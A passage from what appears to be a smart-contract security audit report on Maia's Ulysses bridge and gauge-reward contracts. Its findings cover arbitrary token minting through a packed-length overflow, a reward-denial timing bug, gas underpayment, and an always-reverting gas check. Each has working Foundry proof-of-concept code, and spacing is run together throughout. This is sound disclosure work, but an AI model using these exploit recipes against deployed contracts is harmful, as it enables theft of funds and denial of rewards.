The entry point for a message on theRootChainisanyExecute(bytes calldata data)inRootBridgeAgent.sol. This will be called by theMultichain’sAnycallExecutor. The function will unpack and navigate the supplied flag0x06, corresponding tocallOutSignedAndBridgeMultiple(...)that was invoked on the Branch Chain.
Next,executeSignedWithDepositMultiple(...)will be invoked residing inRootBridgeAgentExecutor.sol, which will subsequently call_bridgeInMultiple(...); however, the amount of data passed to_bridgeInMultiple(...)depends on the packed length of thehTokensarray:
function executeSignedWithDepositMultiple(address _account,address _router,bytes calldata _data,uint24 _fromChainId) external onlyOwner returns (bool success, bytes memory result) {//Bridge In AssetsDepositMultipleParams memory dParams = _bridgeInMultiple(_account,_data[PARAMS_START_SIGNED:PARAMS_END_SIGNED_OFFSET+ uint16(uint8(bytes1(_data[PARAMS_START_SIGNED]))) * PARAMS_TKN_SET_SIZE_MULTIPLE],_fromChainId);// more code ...
If we examine closer, the constants and check with the encoding scheme:
PARAMS_START_SIGNED= 21PARAMS_END_SIGNED_OFFSET= 29PARAMS_TKN_SET_SIZE_MULTIPLE= 128
Here, the intended behavior is that_datais sliced in such a way that it removes the flagbytes1(0x06)and themsg.senderaddress. Hence, we start at byte21 - we have 29 to account for thebytes4(nonce),bytes3(chainId)andbytes1(length)for a total of 8 bytes. But remember that byte slicing is exclusive of thesecond byte index + uint16(length) * 128for every set ofhtoken,token,amountanddeposit. What will happen in the attack case is that_datawill be cut short since the length will be 1 instead of 257 and_datawill contain length, nonce, chainId and the first 4 entries of the constructedhTokens[]array.
Now,_bridgeInMultiplewill unpack the_dParamswherenumOfAssets = 1; hence, only 1 iteration, and will populate a set with in reality the first 4 entries of the suppliedhTokens[]in the attack vector:
hTokens[0] = hToken addresstokens[0] = token addressamounts[0] = malicious address payload cast to uint256deposits[0] = malicious address payload cast to uint256
function_bridgeInMultiple(address_recipient,bytescalldata_dParams,uint24_fromChain)internalreturns(DepositMultipleParamsmemorydParams){// Parse Parametersuint8numOfAssets=uint8(bytes1(_dParams[0]));uint32nonce=uint32(bytes4(_dParams[PARAMS_START:5]));uint24toChain=uint24(bytes3(_dParams[_dParams.length-3:_dParams.length]));address[]memoryhTokens=newaddress[](numOfAssets);address[]memorytokens=newaddress[](numOfAssets);uint256[]memoryamounts=newuint256[](numOfAssets);uint256[]memorydeposits=newuint256[](numOfAssets);for(uint256i=0;i<uint256(uint8(numOfAssets));) {//Parse ParamshTokens[i] =address(uint160(bytes20(bytes32(_dParams[PARAMS_TKN_START+ (PARAMS_ENTRY_SIZE*i) +12:PARAMS_TKN_START+ (PARAMS_ENTRY_SIZE* (PARAMS_START+i))]))));tokens[i] =address(uint160(bytes20(_dParams[PARAMS_TKN_START+PARAMS_ENTRY_SIZE*uint16(i+numOfAssets) +12:PARAMS_TKN_START+PARAMS_ENTRY_SIZE*uint16(PARAMS_START+i+numOfAssets)])));amounts[i] =uint256(bytes32(_dParams[PARAMS_TKN_START+PARAMS_AMT_OFFSET*uint16(numOfAssets) + (PARAMS_ENTRY_SIZE*uint16(i)):PARAMS_TKN_START+PARAMS_AMT_OFFSET*uint16(numOfAssets)+PARAMS_ENTRY_SIZE*uint16(PARAMS_START+i)]));deposits[i] =uint256(bytes32(_dParams[PARAMS_TKN_START+PARAMS_DEPOSIT_OFFSET*uint16(numOfAssets) + (PARAMS_ENTRY_SIZE*uint16(i)):PARAMS_TKN_START+PARAMS_DEPOSIT_OFFSET*uint16(numOfAssets)+PARAMS_ENTRY_SIZE*uint16(PARAMS_START+i)]));unchecked{++i;}}//Save Deposit Multiple ParamsdParams=DepositMultipleParams({numberOfAssets:numOfAssets,depositNonce:nonce,hTokens:hTokens,tokens:tokens,amounts:amounts,deposits:deposits,toChain:toChain});RootBridgeAgent(payable(msg.sender)).bridgeInMultiple(_recipient,dParams,_fromChain);}
Subsequently,bridgeInMultiple(...)is called inRootBridgeAgent.sol, wherebridgeIn(...)is called for every set ofhToken,token,amountanddeposit; one iteration in the attack scenario.
FunctionbridgeIn(...)now performs the criticalcheckParamsfrom theCheckParamsLiblibrary where if only 1 of 3 conditions istrue, we will have a revert.
The first check is reverted if_dParams.amount < _dParams.deposit. This is “false” sinceamountanddepositare equal to theuint256cast of thebytespacking of the malicious address payload.
The second check is:
(_dParams.amount > 0 && !IPort(_localPortAddress).isLocalToken(_dParams.hToken, _fromChain))
Here, it’s trueamount > 0; however,_dParams.hTokenis the first entryhTokens[0]of the attack vector’shTokens[]array. Therefore, it is a valid address andisLocalToken(...)will return “true” and will be negated by!, which will make the statement “false” because of&&. Therefore, it is bypassed.
The third check is:
(_dParams.deposit > 0 && !IPort(_localPortAddress).isUnderlyingToken(_dParams.token, _fromChain))
Here, it’s truedeposit > 0; however,_dParams.tokenis the second entryhTokens[1]of the attack vector’shTokens[]array. Therefore, it is a valid underlying address andisUnderlyingToken(...)will return “true” and will be negated by!, which will make the statement “false” because of&&. Therefore, it is bypassed.
Entire functioncheckParams(...):
functioncheckParams(address_localPortAddress,DepositParamsmemory_dParams,uint24_fromChain)internalviewreturns(bool){if((_dParams.amount<_dParams.deposit)//Deposit can't be greater than amount.|| (_dParams.amount>0&& !IPort(_localPortAddress).isLocalToken(_dParams.hToken,_fromChain))//Check local exists.|| (_dParams.deposit>0&& !IPort(_localPortAddress).isUnderlyingToken(_dParams.token,_fromChain))//Check underlying exists.) {returnfalse;}returntrue;}
Now, back tobridgeIn(...)inRootBridgeAgent, we get theglobalAddressfor_dParams.hToken(again this is the validhToken[0]address from Branch Chain) andbridgeToRoot(...)is called that resides inRootPort.sol.
//Get global addressaddressglobalAddress=IPort(localPortAddress).getGlobalTokenFromLocal(_dParams.hToken,_fromChain);//Check if valid assetif(globalAddress==address(0))revertInvalidInputParams();//Move hTokens from Branch to Root + Mint Sufficient hTokens to match new port depositIPort(localPortAddress).bridgeToRoot(_recipient,globalAddress,_dParams.amount,_dParams.deposit,_fromChain);
The functionbridgeToRoot(...)will check if theglobalAddressis valid and it is since we got it from the validhTokens[0]entry in the constructed attack. Then,_amount - _deposit = 0; therefore, no tokens will be transferred and finally, the critical lineif (_deposit > 0) mint(_recipient, _hToken, _deposit, _fromChainId). Here,_depositis the malicious address payload that was packed to bytes and then unpacked and cast touint256. Then,_hTokenis the global address that we got fromhTokens[0]back in the unpacking. Therefore, whatever the value of theuint256representation of the malicious address is will be minted to the attacker.
Coded PoC
Copy the two functionstestArbitraryMintand_prepareAttackVectorintest/ulysses-omnichain/RootTest.t.soland place them in theRootTestcontract after the setup.
Execute withforge test --match-test testArbitraryMint -vv
The result is800000000in minted tokens for free in the attacker’sVirtualAccount.
functiontestArbitraryMint()public{// setup function used by developers to add local/global tokens in the systemtestAddLocalTokenArbitrum();// set attacker address & mint 1 ether to cover gas costaddressattacker=address(0xAAAA);hevm.deal(attacker,1ether);// get avaxMockAssetHtoken global address that's on the RootaddressglobalAddress=rootPort.getGlobalTokenFromLocal(avaxMockAssethToken,avaxChainId);// prepare attack vectorbytesmemoryparams="";DepositMultipleInputmemorydParams=_prepareAttackVector();uint128remoteExecutionGas=200_000_000_0;console2.log("------------------");console2.log("------------------");console2.log("ARBITRARY MINT LOG");console2.log("Attacker address",attacker);console2.log("Avax h token address",avaxMockAssethToken);console2.log("Avax underlying address",address(avaxMockAssetToken));console2.log("Attacker h token balance",ERC20hTokenBranch(avaxMockAssethToken).balanceOf(attacker));console2.log("Attacker underlying balance",avaxMockAssetToken.balanceOf(attacker));// execute attackhevm.prank(attacker);avaxMulticallBridgeAgent.callOutSignedAndBridgeMultiple{value:0.00005ether}(params,dParams,remoteExecutionGas);// get attacker's virtual account addressaddressvaccount=address(rootPort.getUserAccount(attacker));console2.log("Attacker h token balance avax",ERC20hTokenBranch(avaxMockAssethToken).balanceOf(attacker));console2.log("Attacker underlying balance avax",avaxMockAssetToken.balanceOf(attacker));console2.log("Attacker h token balance root",ERC20hTokenRoot(globalAddress).balanceOf(vaccount));console2.log("ARBITRARY MINT LOG END");console2.log("------------------");}function_prepareAttackVector()internalviewreturns(DepositMultipleInputmemory) {// hToken addressaddressaddr1=avaxMockAssethToken;// underlying addressaddressaddr2=address(avaxMockAssetToken);// 0x2FAF0800 when encoded to bytes and then cast to uint256 = 800000000addressmalicious_address=address(0x2FAF0800);uint256amount1=0;uint256amount2=0;uintnum=257;address[]memoryhtokens=newaddress[](num);address[]memorytokens=newaddress[](num);uint256[]memoryamounts=newuint256[](num);uint256[]memorydeposits=newuint256[](num);for(uinti=0;i<num;i++) {htokens[i] =addr1;tokens[i] =addr2;amounts[i] =amount1;deposits[i] =amount2;}// address of the underlying tokenhtokens[1] =addr2;// copy of entry containing the arbitrary number of tokenshtokens[2] =malicious_address;// entry containing the arbitrary number of tokens -> this one will be actually fed to mint on Roothtokens[3] =malicious_address;uint24toChain=rootChainId;// create inputDepositMultipleInputmemoryinput=DepositMultipleInput({hTokens:htokens,tokens:tokens,amounts:amounts,deposits:deposits,toChain:toChain});returninput;}
Recommendation
Enforce stricter checks around input param validation on bridging multiple tokens.
Assessed type
Invalid Validation
0xBugsy (Maia) confirmed and commented:
The maximum 256 length should be enforced so the encodedN(length)value is truthful. In addition,CheckParamsshould check if the underlying token matches thehTokeninstead of only checking if it’s an underlying token in the system.
0xLightt (Maia) commented:
Addressedhere.

[H-13] Re-adding a deprecated gauge in a new epoch before callingupdatePeriod()/queueRewardsForCycle()will leave some gauges without rewards
Submitted byVoyvoda
Lines of code
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-20/ERC20Gauges.sol#L174-L181https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-20/ERC20Gauges.sol#L407-L422https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/rewards/rewards/FlywheelGaugeRewards.sol#L72-L104
Impact
One or more gauges will remain without rewards. A malicious user can DOS a selected gauge from receiving rewards.
Proof of Concept
When a gauge is deprecated, its weight is subtracted fromtotalWeight; however, the weight of the gauge itself could remain different from 0 (it’s up to the users to remove their votes). That’s reflected in_addGauge().
function_addGauge(addressgauge)internalreturns(uint112weight) {// some code ...// Check if some previous weight exists and re-add to the total. Gauge and user weights are preserved.weight=_getGaugeWeight[gauge].currentWeight;if(weight>0) {_writeGaugeWeight(_totalWeight,_add112,weight,currentCycle);}emitAddGauge(gauge);}
WhenaddGauge(...)is invoked to re-add a gauge that was previously deprecated and still contains votes,_writeGaugeWeight(...)is called to add the gauge’s weight tototalWeight. When the write operation tototalWeightis performed during a new cycle, but beforeupdatePeriodorqueueRewardsForCycle()are called, we will have:
totalWeight.storedWeight = currentWeight(the weight before the update),totalWeight.currentWeight = newWeight(the new weight) andtotalWeight.currentCycle = cycle(the updated new cycle).
The problem is, that when nowqueueRewardsForCycle()is called and subsequently in the call chaincalculateGaugeAllocation(...)is called (which in turn will request thetotalWeightthrough_getStoredWeight(_totalWeight, currentCycle)), we will read the oldtotalWeight(i.e.totalWeight.storedWeight) becausetotalWeight.currentCycle < currentCycleis false, as the cycle was already updated during theaddGauge(...)call.
function_getStoredWeight(WeightstoragegaugeWeight,uint32currentCycle)internalviewreturns(uint112) {returngaugeWeight.currentCycle<currentCycle?gaugeWeight.currentWeight:gaugeWeight.storedWeight;}
This will now cause a wrong calculation of the rewards since we have 1 extra gauge, but the value oftotalWeightis less than what it is in reality. Therefore, the sum of the rewards among the gauges for the cycle will be more than the total sum allocated by the minter. In other words, the function in the code snippet below will be called for every gauge, including the re-added, buttotalis less than what it has to be.
functioncalculateGaugeAllocation(addressgauge,uint256quantity)externalviewreturns(uint256) {if(_deprecatedGauges.contains(gauge))return0;uint32currentCycle=_getGaugeCycleEnd();uint112total=_getStoredWeight(_totalWeight,currentCycle);uint112weight=_getStoredWeight(_getGaugeWeight[gauge],currentCycle);return(quantity*weight) /total;}
This can now cause several areas of concern.
First, in the presented scenario where a gauge is re-added with weight > 0 beforequeueRewardsForCycle(...), the last gauge (or perhaps the last few gauges, depending on the distribution of weight) among the active gauges that callsgetAccruedRewards()won’t receive awards since there will be less rewards than what’s recorded in the gauge state.
Second, in a scenario where we might have several gauges is with a “whale” gauge that holds a majority of votes and therefore, will have a large amount of rewards. A malicious actor can monitor for when a gauge is re-added and front rungetAccruedRewards()(potentially throughnewEpoch()inBaseV2Gauge) for all gauges, except the “whale” and achieving a DOS where the “whale” gauge won’t receive the rewards for the epoch. Therefore, the reputation of it will be damaged. This can be done for any gauge, but will have a more significant impact in the case where a lot of voters are denied their awards.
Coded PoC
Scenario 1
Initially, there are 2 gauges with 75%/25% split of the votes. The gauge with 25% of the votes is removed for 1 cycle and then re-added during a new cycle but before queuing of the rewards. The 25% gauge withdraws its rewards and the 75% gauge is bricked and can’t withdraw rewards.
Copy the functionstestInitialGauge&testDeprecatedAddedGaugeandhelper_gauge_statein/test/rewards/rewards/FlywheelGaugeRewardsTest.t.sol.
Addimport "lib/forge-std/src/console.sol";to the imports.
Execute withforge test --match-test testDeprecatedAddedGauge -vv.
Result: gauge 2 will revert after trying to collect rewards after the 3rd cycle, since gauge 1 was re-added before queuing rewards.
functiontestInitialGauge()public{uint256amount_rewards;// rewards is 100e18// add 2 gauges, 25%/75% splitgaugeToken.addGauge(gauge1);gaugeToken.addGauge(gauge2);gaugeToken.incrementGauge(gauge1,1e18);gaugeToken.incrementGauge(gauge2,3e18);console.log("--------------Initial gauge state--------------");helper_gauge_state();// do one normal cycle of rewardshevm.warp(block.timestamp+1000);amount_rewards=rewards.queueRewardsForCycle();console.log("--------------After 1st queueRewardsForCycle state--------------");console.log('nextCycleQueuedRewards',amount_rewards);helper_gauge_state();// collect awardshevm.prank(gauge1);rewards.getAccruedRewards();hevm.prank(gauge2);rewards.getAccruedRewards();console.log("--------------After getAccruedRewards state--------------");helper_gauge_state();}functiontestDeprecatedAddedGauge()public{uint256amount_rewards;// setup + 1 normal cycletestInitialGauge();// remove gaugegaugeToken.removeGauge(gauge1);// do one more normal cycle with only 1 gaugehevm.warp(block.timestamp+1000);amount_rewards=rewards.queueRewardsForCycle();console.log("--------------After 2nd queueRewardsForCycle state--------------");console.log('nextCycleQueuedRewards',amount_rewards);// examine statehelper_gauge_state();hevm.prank(gauge2);rewards.getAccruedRewards();console.log("--------------After getAccruedRewards state--------------");// examine statehelper_gauge_state();// A new epoch can start for 1 more cyclehevm.warp(block.timestamp+1000);// Add the gauge back, but before rewards are queuedgaugeToken.addGauge(gauge1);amount_rewards=rewards.queueRewardsForCycle();console.log("--------------After 3rd queueRewardsForCycle state--------------");// examine stateconsole.log('nextCycleQueuedRewards',amount_rewards);helper_gauge_state();// this is finehevm.prank(gauge1);rewards.getAccruedRewards();// this revertshevm.prank(gauge2);rewards.getAccruedRewards();console.log("--------------After getAccruedRewards state--------------");// examine statehelper_gauge_state();}functionhelper_gauge_state()publicview{console.log('FlywheelRewards balance',rewardToken.balanceOf(address(rewards)));console.log('gaugeCycle',rewards.gaugeCycle());address[]memorygs=gaugeToken.gauges();for(uinti=0;i<gs.length;i++) {console.log('-------------');(uint112prior1,uint112stored1,uint32cycle1) =rewards.gaugeQueuedRewards(ERC20(gs[i]));console.log("Gauge ",i+1);console.log("priorRewards",prior1);console.log("cycleRewards",stored1);console.log("storedCycle",cycle1);}console.log('-------------');}
Scenario 2
Initially, there are 4 gauges with (2e18 | 2e18 | 6e18 | 4e18) votes respectively. The gauge with 4e18 votes is removed for 1 cycle and then re-added during a new cycle but before queuing of the rewards. The 6e18 gauge withdraws its rewards and the 4e18 gauge withdraws its rewards. The two gauges with 2e18 votes are bricked and can’t withdraw rewards.
Copy the functionstestInitialGauge2,testDeprecatedAddedGauge2andhelper_gauge_statein/test/rewards/rewards/FlywheelGaugeRewardsTest.t.sol.
Execute withforge test --match-test testDeprecatedAddedGauge2 -vv.
Result: the 2 gauges with 2e18 votes will revert after trying to collect rewards.
functiontestInitialGauge2()public{uint256amount_rewards;// rewards is 100e18// add 4 gauges, 2x/2x/6x/4x splitgaugeToken.addGauge(gauge1);gaugeToken.addGauge(gauge2);gaugeToken.addGauge(gauge3);gaugeToken.addGauge(gauge4);gaugeToken.incrementGauge(gauge1,2e18);gaugeToken.incrementGauge(gauge2,2e18);gaugeToken.incrementGauge(gauge3,6e18);gaugeToken.incrementGauge(gauge4,4e18);console.log("--------------Initial gauge state--------------");helper_gauge_state();// do one normal cycle of rewardshevm.warp(block.timestamp+1000);amount_rewards=rewards.queueRewardsForCycle();console.log("--------------After 1st queueRewardsForCycle state--------------");console.log('nextCycleQueuedRewards',amount_rewards);helper_gauge_state();// collect awardshevm.prank(gauge1);rewards.getAccruedRewards();hevm.prank(gauge2);rewards.getAccruedRewards();hevm.prank(gauge3);rewards.getAccruedRewards();hevm.prank(gauge4);rewards.getAccruedRewards();console.log("--------------After getAccruedRewards state--------------");helper_gauge_state();}functiontestDeprecatedAddedGauge2()public{uint256amount_rewards;// setup + 1 normal cycletestInitialGauge2();// remove gaugegaugeToken.removeGauge(gauge4);// do one more normal cycle with only 3 gaugeshevm.warp(block.timestamp+1000);amount_rewards=rewards.queueRewardsForCycle();console.log("--------------After 2nd queueRewardsForCycle state--------------");console.log('nextCycleQueuedRewards',amount_rewards);// examine statehelper_gauge_state();hevm.prank(gauge1);rewards.getAccruedRewards();hevm.prank(gauge2);rewards.getAccruedRewards();hevm.prank(gauge3);rewards.getAccruedRewards();console.log("--------------After getAccruedRewards state--------------");// examine statehelper_gauge_state();// A new epoch can start for 1 more cyclehevm.warp(block.timestamp+1000);// Add the gauge back, but before rewards are queuedgaugeToken.addGauge(gauge4);amount_rewards=rewards.queueRewardsForCycle();console.log("--------------After 3rd queueRewardsForCycle state--------------");console.log('nextCycleQueuedRewards',amount_rewards);// examine statehelper_gauge_state();// this is finehevm.prank(gauge3);rewards.getAccruedRewards();// this is finehevm.prank(gauge4);rewards.getAccruedRewards();// this revertshevm.prank(gauge1);rewards.getAccruedRewards();// this reverts, same weight as gauge 1hevm.prank(gauge2);rewards.getAccruedRewards();console.log("--------------After getAccruedRewards state--------------");// examine statehelper_gauge_state();}functionhelper_gauge_state()publicview{console.log('FlywheelRewards balance',rewardToken.balanceOf(address(rewards)));console.log('gaugeCycle',rewards.gaugeCycle());address[]memorygs=gaugeToken.gauges();for(uinti=0;i<gs.length;i++) {console.log('-------------');(uint112prior1,uint112stored1,uint32cycle1) =rewards.gaugeQueuedRewards(ERC20(gs[i]));console.log("Gauge ",i+1);console.log("priorRewards",prior1);console.log("cycleRewards",stored1);console.log("storedCycle",cycle1);}console.log('-------------');}
Recommendation
When a new cycle starts, make sure gauges are re-added after rewards are queued in a cycle.
Assessed type
Timing
0xLightt (Maia) confirmed
0xLightt (Maia) commented:
Addressedhere.

[H-14] User may underpay for the remote callExecutionGason the root chain
Submitted byEvo, also found byxuwinnie
User may underpay for the remote callExecutionGas. Meaning, the incorrectminExecCostis being deposited at the_replenishGascall inside_payExecutionGasfunction.
Proof of Concept
Multichain contracts -anycallv7 lines:https://github.com/anyswap/multichain-smart-contracts/blob/645d0053d22ed63005b9414b5610879094932304/contracts/anycall/v7/AnycallV7Upgradeable.sol#L265https://github.com/anyswap/multichain-smart-contracts/blob/645d0053d22ed63005b9414b5610879094932304/contracts/anycall/v7/AnycallV7Upgradeable.sol#L167https://github.com/anyswap/multichain-smart-contracts/blob/645d0053d22ed63005b9414b5610879094932304/contracts/anycall/v7/AnycallV7Upgradeable.sol#L276
Ulysses-omnichain contract lines:https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L811https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L851
The user is paying the incorrect minimum execution cost forAnycall MutlichainL820, as the value ofminExecCostis calculated incorrectly. TheAnycallV7protocol considers a premium fee (_feeData.premium) on top of the TX gas price, which is not considered here.
Let’s get into the flow from the start. WhenanyExecis called by the executor (L265), theanycallrequest that comes from a source chain includes thechargeDestFeemodifier.
functionanyExec(address_to,bytescalldata_data,stringcalldata_appID,RequestContextcalldata_ctx,bytescalldata_extdata)externalvirtuallockwhenNotPausedchargeDestFee(_to, _ctx.flags)onlyMPC{IAnycallConfig(config).checkExec(_appID,_ctx.from,_to);
Now, thechargeDestFeemodifier will call thechargeFeeOnDestChainfunction as well atL167.
/// @dev Charge an account for execution costs on this chain/// @param _from The account to charge for execution costsmodifierchargeDestFee(address_from,uint256_flags) {if(_isSet(_flags,AnycallFlags.FLAG_PAY_FEE_ON_DEST)) {uint256_prevGasLeft=gasleft();_;IAnycallConfig(config).chargeFeeOnDestChain(_from,_prevGasLeft);}else{_;}}
As you see here inL198-L210, inside thechargeFeeOnDestChainfunction includes_feeData.premiumfor the execution costtotalCost.
functionchargeFeeOnDestChain(address_from,uint256_prevGasLeft)externalonlyAnycallContract{if(!_isSet(mode,FREE_MODE)) {uint256gasUsed=_prevGasLeft+EXECUTION_OVERHEAD-gasleft();uint256totalCost=gasUsed* (tx.gasprice+_feeData.premium);uint256budget=executionBudget[_from];require(budget>totalCost,"no enough budget");executionBudget[_from] =budget-totalCost;_feeData.accruedFees+=uint128(totalCost);}}
The conclusion: theminExecCostcalculation doesn’t include_feeData.premiumatL811, according to the MultichainAnycallV7protocol.
You should include_feeData.premiuminminExecCostas well. The same as inL204.
uint256 totalCost = gasUsed * (tx.gasprice + _feeData.premium);
This also applicable on:_payFallbackGas()inRootBridgeAgentatL836._payFallbackGas()inBranchBridgeAgentatL1066._payExecutionGasinBranchBridgeAgentatL1032.
Recommended Mitigation Steps
Add_feeData.premiumtominExecCostat the_payExecutionGasfunctionL811.
You need to get_feeData.premiumfirst fromAnycallV7Configby thepremium() function atL286-L288.
uint256 minExecCost = (tx.gasprice  + _feeData.premium) * (MIN_EXECUTION_OVERHEAD + _initialGas - gasleft()));
0xBugsy (Maia) confirmed and commented:
We recognize the audit’s findings on Anycall Gas Management. These will not be rectified due to the upcoming migration of this section to LayerZero.

[H-15] The difference betweengasLeftandgasAfterTransferis greater thanTRANSFER_OVERHEAD, causinganyExecuteto always fail
Submitted byKoolex
In_payExecutionGas,  there is the following code:
///Save gas leftuint256gasLeft=gasleft();....//Transfer gas remaining to recipientSafeTransferLib.safeTransferETH(_recipient,gasRemaining-minExecCost);//Save Gasuint256gasAfterTransfer=gasleft();//Check if sufficient balanceif(gasLeft-gasAfterTransfer>TRANSFER_OVERHEAD) {_forceRevert();return;}
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1029-L1054
It checks if the difference betweengasLeftandgasAfterTransferis greater thanTRANSFER_OVERHEAD. Then, it calls_forceRevert()so thatAnycall Executorreverts the call. This check has been introduced to prevent any arbitrary code executed in the_recipient's fallback(this was confirmed by the sponsor). However, the conditiongasLeft - gasAfterTransfer > TRANSFER_OVERHEADis always true.TRANSFER_OVERHEADis24_000.
uint256internalconstantTRANSFER_OVERHEAD=24_000;
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L139
And thegas spent betweengasLeftandgasAfterTransferis nearly70_000which is higher than24_000. Thus, causing the function to always revert. Function_payExecutionGasis called byanyExecutewhich is called by theAnycall Executor. This meansanyExecutewill also fail. This happens because thegasLeftvalue is stored before replenishing gas and not before the transfer.
Proof of Concept
This PoC is independent from the codebase (but uses the same code). There is one contract simulatingBranchBridgeAgent.anyExecute.
When we run the test,anyExecutewill revert becausegasLeft - gasAfterTransferis always greater thanTRANSFER_OVERHEAD(24_000).
Here is the output of the test:
[PASS]test_anyexecute_always_revert_bc_transfer_overhead() (gas: 124174)Logs:(gasLeft - gasAfterTransfer > TRANSFER_OVERHEAD) =>truegasLeft - gasAfterTransfer = 999999999999979606 - 999999999999909238 = 70368Test result: ok. 1 passed; 0 failed; finishedin1.88ms
Explanation
TheBranchBridgeAgent.anyExecutemethod depends on the following external calls:
AnycallExecutor.context()AnycallProxy.config()AnycallConfig.executionBudget()AnycallConfig.withdraw()AnycallConfig.deposit()WETH9.withdraw()
For this reason, I’ve copied the same code frommultichain-smart-contracts. ForWETH9, I’ve used the contract from the codebase which has minimal code.
Please note that:
tx.gaspriceis replaced with a fixed value in the_payExecutionGasmethod, as it is not available in Foundry.In_replenishGas, reading the config viaIAnycallProxy(localAnyCallAddress).config()is replaced with an immediate call for simplicity. In other words, avoiding a proxy to make the PoC simpler and shorter. However, if done with a proxy, the gas used would increase. So in both ways, it is in favor of the PoC.In_forceRevert, we callanycallConfig, immediately skipping the returned value fromAnycallProxy. This is irrelevant for this PoC.
The Coded PoC
Foundry.toml[profile.default]solc ='0.8.17'src ='solidity'test='solidity/test'out ='out'libs = ['lib']fuzz_runs = 1000optimizer_runs = 10_000.gitmodules
[submodule"lib/ds-test"]path = lib/ds-testurl = https://github.com/dapphub/ds-testbranch = master[submodule"lib/forge-std"]path = lib/forge-stdurl = https://github.com/brockelmore/forge-stdbranch = master
remappings.txt
ds-test/=lib/ds-test/srcforge-std/=lib/forge-std/src
Test File:
// PoC => Maia OmniChain: anyExecute always revert in BranchBridgeAgentpragmasolidity>=0.8.4<0.9.0;import{Test}from"forge-std/Test.sol";import"forge-std/console.sol";import{DSTest}from"ds-test/test.sol";librarySafeTransferLib{/*Â´:Â°â€¢.Â°+.*â€¢Â´.*:Ëš.Â°*.Ëšâ€¢Â´.Â°:Â°â€¢.Â°â€¢.*â€¢Â´.*:Ëš.Â°*.Ëšâ€¢Â´.Â°:Â°â€¢.Â°+.*â€¢Â´.*:*//-                     CUSTOM ERRORS*//*.â€¢Â°:Â°.Â´+Ëš.*Â°.Ëš:*.Â´â€¢*.+Â°.â€¢Â°:Â´*.Â´â€¢*.â€¢Â°.â€¢Â°:Â°.Â´:â€¢ËšÂ°.*Â°.Ëš:*.Â´+Â°.â€¢*//// @dev The ETH transfer has failed.errorETHTransferFailed();/// @dev The ERC20 `transferFrom` has failed.errorTransferFromFailed();/// @dev The ERC20 `transfer` has failed.errorTransferFailed();/// @dev The ERC20 `approve` has failed.errorApproveFailed();/*Â´:Â°â€¢.Â°+.*â€¢Â´.*:Ëš.Â°*.Ëšâ€¢Â´.Â°:Â°â€¢.Â°â€¢.*â€¢Â´.*:Ëš.Â°*.Ëšâ€¢Â´.Â°:Â°â€¢.Â°+.*â€¢Â´.*:*//-                       CONSTANTS*//*.â€¢Â°:Â°.Â´+Ëš.*Â°.Ëš:*.Â´â€¢*.+Â°.â€¢Â°:Â´*.Â´â€¢*.â€¢Â°.â€¢Â°:Â°.Â´:â€¢ËšÂ°.*Â°.Ëš:*.Â´+Â°.â€¢*//// @dev Suggested gas stipend for contract receiving ETH/// that disallows any storage writes.uint256internalconstant_GAS_STIPEND_NO_STORAGE_WRITES=2300;/// @dev Suggested gas stipend for contract receiving ETH to perform a few/// storage reads and writes, but low enough to prevent griefing./// Multiply by a small constant (e.g. 2), if needed.uint256internalconstant_GAS_STIPEND_NO_GRIEF=100000;/*Â´:Â°â€¢.Â°+.*â€¢Â´.*:Ëš.Â°*.Ëšâ€¢Â´.Â°:Â°â€¢.Â°â€¢.*â€¢Â´.*:Ëš.Â°*.Ëšâ€¢Â´.Â°:Â°â€¢.Â°+.*â€¢Â´.*:*//-                     ETH OPERATIONS*//*.â€¢Â°:Â°.Â´+Ëš.*Â°.Ëš:*.Â´â€¢*.+Â°.â€¢Â°:Â´*.Â´â€¢*.â€¢Â°.â€¢Â°:Â°.Â´:â€¢ËšÂ°.*Â°.Ëš:*.Â´+Â°.â€¢*//// @dev Sends `amount` (in wei) ETH to `to`./// Reverts upon failure.////// Note: This implementation does NOT protect against gas griefing./// Please use `forceSafeTransferETH` for gas griefing protection.functionsafeTransferETH(addressto,uint256amount)internal{/// @solidity memory-safe-assemblyassembly{// Transfer the ETH and check if it succeeded or not.ifiszero(call(gas(),to,amount,0,0,0,0)) {// Store the function selector of `ETHTransferFailed()`.mstore(0x00,0xb12d13eb)// Revert with (offset, size).revert(0x1c,0x04)}}}/// @dev Force sends `amount` (in wei) ETH to `to`, with a `gasStipend`./// The `gasStipend` can be set to a low enough value to prevent/// storage writes or gas griefing.////// If sending via the normal procedure fails, force sends the ETH by/// creating a temporary contract which uses `SELFDESTRUCT` to force send the ETH.////// Reverts if the current contract has insufficient balance.functionforceSafeTransferETH(addressto,uint256amount,uint256gasStipend)internal{/// @solidity memory-safe-assemblyassembly{// If insufficient balance, revert.iflt(selfbalance(),amount) {// Store the function selector of `ETHTransferFailed()`.mstore(0x00,0xb12d13eb)// Revert with (offset, size).revert(0x1c,0x04)}// Transfer the ETH and check if it succeeded or not.ifiszero(call(gasStipend,to,amount,0,0,0,0)) {mstore(0x00,to)// Store the address in scratch space.mstore8(0x0b,0x73)// Opcode `PUSH20`.mstore8(0x20,0xff)// Opcode `SELFDESTRUCT`.// We can directly use `SELFDESTRUCT` in the contract creation.// Compatible with `SENDALL`: https://eips.ethereum.org/EIPS/eip-4758ifiszero(create(amount,0x0b,0x16)) {// To coerce gas estimation to provide enough gas for the `create` above.ifiszero(gt(gas(),1000000)) {revert(0,0)}}}}}/// @dev Force sends `amount` (in wei) ETH to `to`, with a gas stipend/// equal to `_GAS_STIPEND_NO_GRIEF`. This gas stipend is a reasonable default/// for 99% of cases and can be overridden with the three-argument version of this/// function if necessary.////// If sending via the normal procedure fails, force sends the ETH by/// creating a temporary contract which uses `SELFDESTRUCT` to force send the ETH.////// Reverts if the current contract has insufficient balance.functionforceSafeTransferETH(addressto,uint256amount)internal{// Manually inlined because the compiler doesn't inline functions with branches./// @solidity memory-safe-assemblyassembly{// If insufficient balance, revert.iflt(selfbalance(),amount) {// Store the function selector of 